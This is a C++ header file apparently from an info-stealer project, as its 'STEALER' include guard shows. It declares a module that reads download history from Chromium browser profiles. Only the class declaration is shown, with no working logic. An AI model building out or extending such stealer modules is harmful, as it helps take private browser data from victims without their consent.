//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CDOWNLOADS_H
#define STEALER_CDOWNLOADS_H


#include "../ChromiumBrowserModule.h"
#include "../../../../../utils/SQLiteUtil.h"

class CDownloads : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
};


#endif //STEALER_CDOWNLOADS_H
